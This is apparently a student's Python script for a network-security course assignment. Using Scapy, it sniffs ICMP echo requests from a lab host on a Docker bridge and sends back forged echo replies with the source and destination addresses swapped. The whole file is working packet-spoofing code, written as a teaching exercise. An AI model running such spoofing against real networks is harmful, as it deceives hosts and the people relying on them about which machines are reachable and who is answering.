	
#!/usr/bin/python3
from scapy.all import *
print("CMPE209-Assignment1-016707314-Task1.4-Sniffing and Spoofing packets from an existing host on the Internet");
def spoof_pkt(pkt):
    #newseq=0
    if ICMP in pkt:
        print("Original packet.........")
        print("Source IP :", pkt [IP].src)
        print("Destination IP :", pkt [IP]. dst)
        srcip = pkt [IP]. dst
        dstip = pkt[IP].src
        newihl = pkt [IP]. ihl		#Internet Header Length(IHL)
        newtype = 0
        newid = pkt [ICMP].id
        newseq = pkt [ICMP]. seq
        data = pkt [Raw]. load
        IPLayer = IP (src=srcip, dst=dstip, ihl=newihl)
        ICMPpkt = ICMP (type=newtype, id=newid, seq=newseq)
        newpkt = IPLayer/ICMPpkt/data
        print ("spoofed packet........")
        print ("Source IP:", newpkt [IP].src)
        print ("Destination IP:", newpkt [IP]. dst)
        print("")
        print("")
        print("")
        send (newpkt, verbose=0)
pkt = sniff (iface="br-62f4ebf4c30a",filter='icmp and src host 10.9.0.5', prn=spoof_pkt)

